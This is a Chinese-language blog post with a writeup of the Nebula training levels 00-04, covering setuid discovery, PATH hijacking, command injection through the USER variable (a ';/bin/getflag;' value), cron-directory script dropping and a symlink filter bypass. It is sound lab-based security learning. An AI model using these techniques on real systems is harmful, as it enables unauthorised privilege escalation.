<!DOCTYPE html>
<html lang="zh-cn">
<head>

    <title>  GreatYYX Blog - Exploit Exercises Nebula level00-04 Writeup
</title>

  <meta charset="utf-8">
  <link rel="dns-prefetch" href="http://yyx.name"/>
  <link rel="dns-prefetch" href="http://www.yyx.name"/>
  <link rel="dns-prefetch" href="http://blog.yyx.name"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="GreatYYX">
  <meta name="robots" content="all">
  <meta name="generator" content="pelican,github,githubpage,jquery,bootstrap,pjax">
  <meta name="description" content="program,guitar,photo,information,security,ctf,writeup">
  <meta name="description" content="编程,开发,音乐,吉他,摄影,信息安全,极客">
  <meta name="baidu-site-verification" content="U9HmJyJXz6" />
  <link rel="shortcut icon" href="http://yyxname.qiniudn.com/theme/img/favicon.ico">
  
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css"/>
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" />
  <link rel="stylesheet" href="http://yyxname.qiniudn.com/theme/css/main.min.css" />
  <style>.loader{background:url('http://yyxname.qiniudn.com/theme/img/loading.gif') no-repeat;}body.bgimg{background: #fff url('http://yyxname.qiniudn.com/theme/img/welcome_bg.jpg') no-repeat center center fixed;}</style>
  <!--[if lt IE 9]>
    <script src="http://cdn.bootcss.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="http://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->

  <link href="http://blog.yyx.name/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="GreatYYX Blog Full Atom Feed" />
  <link href="http://blog.yyx.name/feeds/security.atom.xml" type="application/atom+xml" rel="alternate" title="GreatYYX Blog Categories Atom Feed" />


    <meta name="tags" contents="exploit-exercises,nebula,wargame,hacking,exploit" />

</head>

<body>


<div id="wrapper">
  <div id="nav-main" class="navbar navbar-inverse" role="navigation">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a data-pjax class="navbar-brand" href="http://blog.yyx.name/index.html">
          <img alt="Brand" height="60" width="60" src="http://yyxname.qiniudn.com/theme/img/logo.png">
        </a>
      </div>
      <div class="navbar-collapse collapse">

        <ul class="nav navbar-nav navbar-right">
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Category <span class="caret"></span></a>
            <ul class="dropdown-menu" role="menu">
    <li><a data-pjax href="http://blog.yyx.name/category/security.html">Security</a></li>
    <li><a data-pjax href="http://blog.yyx.name/category/web.html">Web</a></li>
            </ul>
          </li>
          <li><a target="_blank" href="http://photo.yyx.name">Photography</a></li>
          <li><a data-pjax href="http://blog.yyx.name/pages/about.html">About</a></li>
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <span class="glyphicon glyphicon-search"></span>
            </a>
            <ul class="dropdown-menu" role="menu">
              <li>
                <form class="navbar-form">
                <input id="search-input" type="text" class="form-control" placeholder="Search...">
                </form>
              </li>
            </ul>
          </li>
          <li class="dropdown">
            <a href="#" class="dropdown-toggle" data-toggle="dropdown">
              <span class="glyphicon glyphicon-share"></span>
            </a>
            <ul class="dropdown-menu" role="menu">
              <li><a href="http://weibo.com/u/1085956311" target="_blank"><i class="fa fa-weibo"></i>&nbsp;Weibo</a></li>
              <li><a href="http://github.com/GreatYYX"  target="_blank"><i class="fa fa-github"></i>&nbsp;Github</a></li>
            </ul>
          </li>

        </ul>
      </div>
    </div>
  </div><!-- /.navbar -->
    
  <div class="container" id="main-container">
    <div class="row row-offcanvas row-offcanvas-right">
<div id="blog-main" class="col-sm-8 blog-main">
  <h1 class="blog-post-title">Exploit Exercises Nebula level00-04 Writeup</h1>
  <p class="blog-post-meta">
    <i class="fa fa-clock-o"></i>&nbsp;2014-09-06
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <i class="fa fa-folder-o"></i>&nbsp;<a data-pjax href="http://blog.yyx.name/category/security.html">Security</a>
  </p>
  <div class="blog-post" >
    <h1>写在前面</h1>
<p>上上个月成立watch0ut战队之后，开始准备并参与一些CTF比赛。队友大神Jack甩给我们<a href="http://exploit-exercises.com/">exploit-exercises.com</a>这个网站，让我们练习练习漏洞利用。</p>
<p>网站中把漏洞利用分为多类题型，其中Nebula最为简单，主要涉及Linux主机安全及利用的一些常识，可作为整个练习的开始。</p>
<p>另，本文会遵循能不用安装就安装，能不配置就不配置的最(偷)简(懒)策略来完成所有题型。</p>
<p>本文会记录我自己做题的思路和手法，供大家参考，也希望诸位能指出我理解或操作不慎处。</p>
<h1>环境搭建</h1>
<p>首先<a href="http://exploit-exercises.com/download">下载</a>Nebula题目的光盘镜像，该ISO为LiveCD。因此可以不用安装，直接利用现成虚拟机修改为从该ISO启动即可。每次操作完整之后直接点“暂停”保存虚拟机状态即可，下次直接恢复。当然你也可以安装该ISO。</p>
<p>另外，我使用的光盘为exploit-exercises-nebula-5.iso，本系列Writeup全部在这个版本上完成。</p>
<pre><code class="no-highlight">Nebula
----------------------------------------------------------------------------------------------
Download        exploit-exercises-nebula-5.iso
----------------------------------------------------------------------------------------------
Version         5
----------------------------------------------------------------------------------------------
Changes         Moved from OVA to bootable CD format. Reduces issues with importing OVA files.
----------------------------------------------------------------------------------------------
SHA1 Checksum   e82f807be06100bf3e048f82e899fb1fecc24e3a
</code></pre>

<h1>统一规则</h1>
<ul>
<li>每次任务使用任务的level账户登录并执行flag账户权限可执行的getflag文件（一般是这个名字）。比如，任务1使用level01账户，密码也为level01，你需要去寻找方法获取flag01才可以执行的getflag文件并执行它。</li>
<li>当需要系统配置时，使用nebula账户，密码也为nebula，并利用sudo执行需要root权限的操作。</li>
</ul>
<h1>Nebula level00</h1>
<blockquote>
<p>This level requires you to find a Set User ID program that will run as the "flag00" account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.</p>
<p>Alternatively, look at the find man page.</p>
<p>该题要求寻找一个可以SetUID的程序（该程序属于flag00账户）并运行它。你可以从/（根目录）开始寻找。</p>
</blockquote>
<p>目标很明确，搜索一下属于flag00账户的带有SetUID权限的程序即可。果断man find，搜索一下和权限相关的参数，找到<code>-perm</code>，并且看到该参数后加入<code>-mode</code>可以指定匹配所有具有这个权限的文件（注意和<code>mode</code>及<code>/mode</code>的区别，这个<code>-</code>意味着权限的包含关系）。</p>
<p>到这儿我们需要回顾一下Linux下权限的表示方式：Linux的fs中，所有文件/目录/设备等都具有三个级别的用户权限控制，分别是u所有者，g所属群组，o其他用户。对于每个级别，又能分别控制r读w写x执行权限。另外，还有SetUID和SetGID的特殊权限位。</p>
<p>权限表示的时候，rwx和无权限<code>-</code>分别用数字4210表示，并执行位或运算，这样一个级别的用户权限就可以表示了（占用一个byte）。这种方法可以表示出三个不同用户级别的权限。同时加入最前面8bits的特殊权限位，就可以用4byte表示这个文件的完整权限。</p>
<p>例如：</p>
<pre><code class="bash">u       g       o
rwx     r--     r--     0744
rwx     ---     ---     0700
rws     rwx     rwx     4777
rws     rws     rwx     6777
</code></pre>

<p>按照这个标准，我们这儿需要搜索的文件需要SetUID，因此可以构造权限表示为-u=s或者-4000，再考虑到针对文件搜索（限定类型为文件），因此可以构造如下命令（两者一致）。</p>
<pre><code class="bash">find / -perm -u=s -type f -user flag00 &gt; flag.txt
find / -perm -4000 -type f -user flag00 &gt; flag.txt
</code></pre>

<p>之后查看flag.txt中内容，可以发现搜索到两个文件，执行第一个<code>/bin/.../flag00</code>即可过关。</p>
<h1>Nebula level01</h1>
<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
<p>题目说程序有漏洞允许任意程序执行。</p>
</blockquote>
<pre><code class="cpp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&quot;/usr/bin/env echo and now what?&quot;);
}
</code></pre>

<p>程序逻辑很简单：SetUID和SetGID后执行环境变量指定的echo文件，这样<code>and now what?</code>就是参数。因此马上能得到如下思路：</p>
<ul>
<li>看到<code>/usr/bin/env</code>就立即反应过来可以从环境变量下手，修改后优先执行自己的程序。</li>
<li>需要运行getflag，而程序只能运行echo，因此要把echo和getflag关联上。</li>
</ul>
<p>于是乎一气呵成执行以下命令：</p>
<pre><code class="bash">ln -s /bin/getflag echo
PATH=/home/level01:$PATH
cd /home/flag01
./flag01
</code></pre>

<p>这里软连接需要创建在<code>/home/level01</code>或<code>/tmp</code>中，否则没有w权限。至此，此题拿下。</p>
<h1>Nebula level02</h1>
<blockquote>
<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>
<p>和上一题一样的题干，还是找到可任意执行程序的漏洞。</p>
</blockquote>
<pre><code class="cpp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;buffer, &quot;/bin/echo %s is cool&quot;, getenv(&quot;USER&quot;));
  printf(&quot;about to call system(\&quot;%s\&quot;)\n&quot;, buffer);

  system(buffer);
}
</code></pre>

<p>还是环境变量，这次是$USER，反而简单了，直接截断原来的程序即可。上代码：</p>
<pre><code class="bash">USER=&quot;;/bin/getflag;&quot;
</code></pre>

<p>Over :D</p>
<h1>Nebula level03</h1>
<blockquote>
<p>Check the home directory of flag03 and take note of the files there.</p>
<p>There is a crontab that is called every couple of minutes.</p>
<p>题目说检查flag03的home目录，注意里面的文件，同时有一个crontab任务每2分钟执行一次。</p>
</blockquote>
<p>发现writeable.d目录和writeable.sh脚本。脚本内容如下：</p>
<pre><code class="bash">for i in /home/flag03/writeable.d/* ; do
    (ulimit -t 5; bash -x &quot;$i&quot;)
    rm -f &quot;$i&quot;
done
</code></pre>

<p>其中<code>ulmint -t 5</code>控制CPU时间不超过5秒，<code>bash -x "$i"</code>用于执行$i文件。执行完之后删除文件本身。因此，只需要在writeable.d目录下创建文件并执行指令即可。文件内容如下：</p>
<pre><code class="bash">/bin/getflag &gt; result.txt
</code></pre>

<p>等待一段时间，系统会触发这个.sh脚本，之后去看result.txt文件即可发现getflag已经执行。</p>
<p>当然，这儿如果要看具体的crontab的任务事件，用nebula账户登录，执行<code>sudo crontab -u flag03 -l</code>即可。</p>
<h1>Nebula level04</h1>
<blockquote>
<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>
<p>寻找方法绕开读取限制，读取token文件内容。</p>
</blockquote>
<pre><code class="cpp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf(&quot;%s [file to read]\n&quot;, argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &quot;token&quot;) != NULL) {
    printf(&quot;You may not access '%s'\n&quot;, argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, &quot;Unable to open %s&quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
    err(EXIT_FAILURE, &quot;Unable to read fd %d&quot;, fd);
  }

  write(1, buf, rc);
}
</code></pre>

<p>flag04的home目录下有属于level04组的flag04可执行文件和一个token文件（无权限），因此需要调用flag04来读取token。
首先分析程序逻辑，程序有一个参数，但参数名不能是token（和前面一样，用软连接）。之后会读取这个参数为名字的文件，并把文件内容输出到屏幕（1是STD_OUT）。由于flag04目录没有w权限，因此软连接要创建到自己的家目录中。</p>
<pre><code class="bash">ln -s /home/flag04/token ~/flag04passwd
/home/flag04/flag04 ~/flag04passwd
</code></pre>

<p>之后读取home目录下flag04passwd内容，为flag04密码，用flag04账户和获取的密码登陆后getflag。</p>
  </div><!-- /.blog-post -->
  
  <hr>

  <div id="tag-list" class="tag-list">
    <i class="fa fa-tags"></i>
    <a data-pjax href="http://blog.yyx.name/tag/exploit-exercises.html">exploit-exercises</a>
    <a data-pjax href="http://blog.yyx.name/tag/nebula.html">nebula</a>
    <a data-pjax href="http://blog.yyx.name/tag/wargame.html">wargame</a>
    <a data-pjax href="http://blog.yyx.name/tag/hacking.html">hacking</a>
    <a data-pjax href="http://blog.yyx.name/tag/exploit.html">exploit</a>
  </div>

    <!--comment-->
    <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'yyxblog'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

</div><!-- /.blog-main -->

<div id="blog-sidebar" class="hidden-xs col-sm-3 col-sm-offset-1">
<div id="sidebar-fix">
    <!--toc-->
    <div class="sidebar-module">
      <!-- <h4>Table of Contents</h4> -->
      <div id="toc" class="toc"></div>
    </div>
</div><!-- ./sidebar-fix -->
</div><!-- /.blog-sidebar -->
    </div><!-- /.row -->
  </div><!-- /.container -->

  <div id="loading" class="fade"><div class="loader"></div></div>

  <div class="blog-footer">
    <p class="l">©2014&nbsp;<a href="#">GreatYYX</a>.&nbsp;&nbsp;
      <a rel="license" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons" style="border-width:0" src="http://i.creativecommons.org/l/by-nc-sa/4.0/80x15.png" /></a>
    </p>
  </div><!-- /.blog-footer -->

  <div class="float-tool">
    <a id="btn-comment" class="btn hide" title="Comments"><i class="fa fa-comment"></i></a>
    <a id="btn-top" class="btn hide" title="Top"><i class="fa fa-arrow-up"></i></a>
  </div><!-- /.float-tool -->

</div><!-- /.wrapper -->

  <script src="http://code.jquery.com/jquery-2.1.1.min.js"></script>
  <script src="http://code.jquery.com/ui/1.11.2/jquery-ui.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/jquery.tocify.min.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/highlight.pack.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/jquery.pjax.min.js"></script>
  <script src="http://yyxname.qiniudn.com/theme/js/main.min.js"></script>

<div style="display:none">
<script src="http://s19.cnzz.com/z_stat.php?id=1253039383&web_id=1253039383" language="JavaScript"></script>
</div>
<script type="text/javascript">
(function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
(w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
})(window,document,'script','//s.swiftypecdn.com/install/v1/st.js','_st');

_st('install','XwpC765YWzV58fvrdjoQ');
</script>
</body>
</html>